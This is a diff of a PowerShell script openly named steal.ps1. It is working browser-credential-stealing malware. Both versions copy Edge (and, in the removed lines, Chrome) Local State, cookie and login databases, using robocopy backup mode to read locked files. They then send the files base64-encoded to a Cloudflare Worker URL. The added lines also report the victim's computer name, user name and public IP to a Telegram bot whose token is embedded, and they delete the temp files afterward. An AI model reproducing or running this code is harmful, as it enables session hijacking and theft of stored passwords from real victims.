@@ -1,89 +1,74 @@
 # steal.ps1
-# Uses robocopy /B to copy locked Edge/Chrome files.
+# Exfiltrates Edge Local State (master key) and Cookies.db to your Cloudflare Worker.
 
+$t = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
+$c = "6760965981"
 $worker_url = "https://reciever.tyceno89.workers.dev"
-$temp = "$env:TEMP\steal_all"
-New-Item -ItemType Directory -Force -Path $temp | Out-Null
 
-# --- 1) Browser paths ---
-$browsers = @(
-    @{
-        Name = "Edge"
-        LocalState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
-        Cookies = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
-        LoginData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
-        WebData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
-    },
-    @{
-        Name = "Chrome"
-        LocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
-        Cookies = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
-        LoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-        WebData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
-    }
-)
+# --- Send PC info to Telegram ---
+$ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
+$body = @{ chat_id = $c; text = "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip" }
+Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
 
-# --- 2) Helper to copy locked files ---
-function Copy-LockedFile {
+# --- Copy files (with fallback to robocopy /B for locked files) ---
+function Copy-FileWithFallback {
     param($src, $dst)
-    # Try normal copy
+    # 1) Normal copy
     try { Copy-Item $src $dst -Force -ErrorAction Stop; return $true } catch {}
-    # Try robocopy with backup mode (/B)
+    # 2) Try robocopy /B (backup mode – can read locked files if admin)
     try {
         $src_dir = Split-Path $src
         $src_file = Split-Path $src -Leaf
         $dst_dir = Split-Path $dst
-        $result = robocopy $src_dir $dst_dir $src_file /B /R:1 /W:1 /NFL /NDL /NJH /NJS
-        if (Test-Path $dst) { return $true }
+        robocopy $src_dir $dst_dir $src_file /B /R:1 /W:1 /NFL /NDL /NJH /NJS | Out-Null
+        return (Test-Path $dst)
     } catch {}
     return $false
 }
 
-# --- 3) Collect files ---
-$files_to_send = @()
+$temp = "$env:TEMP\exfil"
+New-Item -ItemType Directory -Force -Path $temp | Out-Null
 
-foreach ($b in $browsers) {
-    if (Test-Path $b.LocalState) {
-        $dst = "$temp\$($b.Name)_LocalState.json"
-        if (Copy-LockedFile $b.LocalState $dst) {
-            $files_to_send += @{ name = "$($b.Name)_LocalState.json"; path = $dst }
-        }
-    }
-    if (Test-Path $b.Cookies) {
-        $dst = "$temp\$($b.Name)_Cookies.db"
-        if (Copy-LockedFile $b.Cookies $dst) {
-            $files_to_send += @{ name = "$($b.Name)_Cookies.db"; path = $dst }
-        }
-    }
-    if (Test-Path $b.LoginData) {
-        $dst = "$temp\$($b.Name)_LoginData.db"
-        if (Copy-LockedFile $b.LoginData $dst) {
-            $files_to_send += @{ name = "$($b.Name)_LoginData.db"; path = $dst }
-        }
-    }
-    if (Test-Path $b.WebData) {
-        $dst = "$temp\$($b.Name)_WebData.db"
-        if (Copy-LockedFile $b.WebData $dst) {
-            $files_to_send += @{ name = "$($b.Name)_WebData.db"; path = $dst }
-        }
-    }
+$src_ls = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
+$dst_ls = "$temp\Edge_LocalState.json"
+$src_cookies = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
+$dst_cookies = "$temp\Edge_Cookies.db"
+
+$ls_ok = Copy-FileWithFallback $src_ls $dst_ls
+$cookies_ok = Copy-FileWithFallback $src_cookies $dst_cookies
+
+if (-not $ls_ok) {
+    $body = @{ chat_id = $c; text = "ERROR: Could not copy Local State" }
+    Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
+}
+if (-not $cookies_ok) {
+    $body = @{ chat_id = $c; text = "ERROR: Could not copy Cookies.db" }
+    Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
 }
 
-# --- 4) Send to worker ---
-$payload = @{
-    pc = $env:COMPUTERNAME
-    user = $env:USERNAME
-    files = @{}
+if ($ls_ok -and $cookies_ok) {
+    $bytes_ls = [System.IO.File]::ReadAllBytes($dst_ls)
+    $b64_ls = [Convert]::ToBase64String($bytes_ls)
+    $bytes_cookies = [System.IO.File]::ReadAllBytes($dst_cookies)
+    $b64_cookies = [Convert]::ToBase64String($bytes_cookies)
+    
+    $payload = @{
+        pc = $env:COMPUTERNAME
+        user = $env:USERNAME
+        files = @{
+            "Edge_LocalState.json" = $b64_ls
+            "Edge_Cookies.db" = $b64_cookies
+        }
+    } | ConvertTo-Json -Depth 10
+    
+    try {
+        Invoke-RestMethod -Uri $worker_url -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
+        $body = @{ chat_id = $c; text = "Both files sent successfully" }
+    } catch {
+        $body = @{ chat_id = $c; text = "ERROR sending to worker: $_" }
+    }
+    Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
 }
 
-foreach ($f in $files_to_send) {
-    $bytes = [IO.File]::ReadAllBytes($f.path)
-    $b64 = [Convert]::ToBase64String($bytes)
-    $payload.files[$f.name] = $b64
-    Remove-Item $f.path -Force -ErrorAction SilentlyContinue
-}
-
-$json = $payload | ConvertTo-Json -Depth 10
-Invoke-RestMethod -Uri $worker_url -Method Post -Body $json -ContentType "application/json"
-
+# Cleanup
 Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
